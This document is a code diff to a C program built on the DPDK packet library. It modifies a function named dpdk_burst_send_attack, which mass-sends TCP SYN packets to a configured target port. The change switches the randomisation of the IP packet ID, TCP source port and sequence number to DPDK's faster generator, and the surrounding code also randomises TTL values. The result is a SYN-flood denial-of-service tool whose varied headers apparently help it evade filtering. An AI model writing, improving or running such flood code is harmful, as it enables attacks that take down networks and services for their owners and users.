@@ -3,6 +3,7 @@
 #include <rte_mbuf.h>
 #include <rte_mempool.h>
 #include <rte_ip.h>
+#include <rte_random.h>
 #include <rte_tcp.h>
 #include <rte_udp.h>
 #include <stdio.h>
@@ -234,7 +235,7 @@ uint64_t dpdk_burst_send_attack(struct dpdk_pool_t *pool,
         ip->version_ihl = 0x45;
         ip->type_of_service = 0;
         ip->total_length = rte_cpu_to_be_16(pkt_len - sizeof(*eth));
-        ip->packet_id = rte_cpu_to_be_16((uint16_t)(rand() & 0xFFFF));
+        ip->packet_id = rte_cpu_to_be_16((uint16_t)(rte_rand() & 0xFFFF));
         ip->fragment_offset = 0;
         ip->time_to_live = morph_random_ttl();
         ip->next_proto_id = IPPROTO_TCP;
@@ -244,9 +245,9 @@ uint64_t dpdk_burst_send_attack(struct dpdk_pool_t *pool,
         ip->hdr_checksum = 0;
         ip->hdr_checksum = rte_ipv4_cksum(ip);
 
-        tcp->src_port = (uint16_t)(rand() & 0xFFFF);
+        tcp->src_port = (uint16_t)(rte_rand() & 0xFFFF);
         tcp->dst_port = cfg->target_port;
-        tcp->sent_seq = rte_cpu_to_be_32((uint32_t)(rand()));
+        tcp->sent_seq = rte_cpu_to_be_32((uint32_t)(rte_rand()));
         tcp->ack_seq = 0;
         tcp->data_off = (sizeof(*tcp) >> 2) << 4;
         tcp->tcp_flags = RTE_TCP_SYN_FLAG;
